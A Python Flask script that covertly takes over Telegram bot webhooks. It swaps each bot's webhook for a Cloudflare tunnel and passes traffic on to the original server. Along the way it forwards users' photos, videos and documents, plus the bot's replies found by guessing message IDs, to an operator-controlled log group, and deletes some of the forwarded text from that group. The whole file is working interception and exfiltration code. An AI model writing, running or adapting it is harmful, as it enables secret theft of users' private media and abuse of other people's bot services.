import os
import re
import time
import json
import threading
import subprocess
import requests
from flask import Flask, request, Response
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

app = Flask(__name__)

# --- NETWORK STABILITY CONFIG ---
# This prevents your PC from "freezing" when the friend's server is slow
adapter = HTTPAdapter(pool_connections=50, pool_maxsize=100)
http = requests.Session()
http.mount("https://", adapter)
http.mount("http://", adapter)

# --- CONFIGURATION ---
LOG_GROUP_ID = -10012345678   # <--- PASTE YOUR GROUP ID HERE

CONFIG_FILE = "bot_configs.json"

# PASTE ALL YOUR TOKENS HERE
BOT_TOKENS = [
    "token1",
    "token2",
    "token3",
    "token4",
    "token5",
]

BOT_CONFIGS = {} 

# --- UTILS ---

def load_or_fetch_configs():
    global BOT_CONFIGS
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            try:
                BOT_CONFIGS = json.load(f)
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📂 Loaded {len(BOT_CONFIGS)} saved URLs")
            except: BOT_CONFIGS = {}

    updated = False
    for token in BOT_TOKENS:
        if token in BOT_CONFIGS and BOT_CONFIGS[token] and "trycloudflare" not in BOT_CONFIGS[token]:
            continue
        try:
            res = http.get(f"https://api.telegram.org/bot{token}/getWebhookInfo", timeout=5).json()
            if res.get("ok") and res["result"].get("url"):
                url = res["result"]["url"]
                if "trycloudflare.com" not in url:
                    BOT_CONFIGS[token] = url
                    updated = True
        except: pass

    if updated:
        with open(CONFIG_FILE, "w") as f:
            json.dump(BOT_CONFIGS, f, indent=4)

def start_cloudflare():
    subprocess.run("killall cloudflared 2>/dev/null", shell=True)
    time.sleep(1)
    log_file = "/tmp/cf_proxy.log"
    subprocess.Popen(f"cloudflared tunnel --url http://127.0.0.1:5000 > {log_file} 2>&1", shell=True)
    for _ in range(15):
        time.sleep(1)
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', f.read())
                if match: return match.group(0)
    exit("Cloudflare Failed")

def set_our_webhooks(cf_url):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] ⏳ Waiting for DNS...")
    time.sleep(5)
    for token in BOT_TOKENS:
        if token not in BOT_CONFIGS: continue
        trap_url = f"{cf_url}/{token}"
        for _ in range(3):
            res = http.get(f"https://api.telegram.org/bot{token}/setWebhook?url={trap_url}", timeout=5).json()
            if res.get("ok"): break
            time.sleep(2)

# --- THE VACUUM ---

def vacuum_outputs(bot_token, chat_id, start_msg_id):
    short_id = bot_token.split(':')[0]
    time.sleep(70) # Wait for the server to process the edit
    
    copied_ids = set()
    for attempt in range(1, 4):
        transaction_finished = False
        for guess_id in range(start_msg_id + 1, start_msg_id + 25):
            if guess_id in copied_ids: continue
            
            fwd_url = f"https://api.telegram.org/bot{bot_token}/forwardMessage"
            try:
                # Reduced timeout to 5s to keep the vacuum moving
                res = http.post(fwd_url, json={"chat_id": LOG_GROUP_ID, "from_chat_id": chat_id, "message_id": guess_id}, timeout=5).json()
                if res.get("ok"):
                    copied_ids.add(guess_id)
                    msg = res.get("result", {})
                    if "text" in msg:
                        if "Advanced editing successful" in msg["text"]:
                            transaction_finished = True
                        else:
                            http.post(f"https://api.telegram.org/bot{bot_token}/deleteMessage", json={"chat_id": LOG_GROUP_ID, "message_id": msg["message_id"]}, timeout=3)
                    elif any(k in msg for k in ["photo", "video", "animation", "document"]):
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔮 VACUUM SUCCESS: Bot {short_id}")
            except: continue
            time.sleep(0.4) # Slightly slower sweep to avoid IP triggers
            
        if transaction_finished: break
        time.sleep(60)

# --- THE SWITCHBOARD ---

@app.route('/<bot_token>', methods=['POST'])
def intercept_webhook(bot_token):
    if bot_token not in BOT_CONFIGS: return "Fail", 403
    
    update_json = request.get_json()
    target_url = BOT_CONFIGS[bot_token]
    short_id = bot_token.split(':')[0]
    
    # 1. Detect Media and Trigger Vacuum
    if "message" in update_json:
        msg = update_json["message"]
        if any(k in msg for k in ["photo", "video", "document"]):
            http.post(f"https://api.telegram.org/bot{bot_token}/forwardMessage", 
                      json={"chat_id": LOG_GROUP_ID, "from_chat_id": msg["chat"]["id"], "message_id": msg["message_id"]}, timeout=5)
            threading.Thread(target=vacuum_outputs, args=(bot_token, msg["chat"]["id"], msg["message_id"]), daemon=True).start()

    # 2. Forward everything (including button clicks) to friend
    try:
        # Reduced timeout to 6s so buttons don't jam the whole system
        resp = http.post(target_url, json=update_json, timeout=6)
        return Response(resp.content, status=resp.status_code, headers=dict(resp.headers))
    except Exception as e:
        print(f"⚠️ Forward Error Bot {short_id}: {e}")
        return "OK", 200

if __name__ == '__main__':
    load_or_fetch_configs()
    cf_url = start_cloudflare()
    set_our_webhooks(cf_url)
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🚀 PROXY STABILIZED. Listening on Port 5000...")
    app.run(port=5000, host="0.0.0.0", threaded=True)
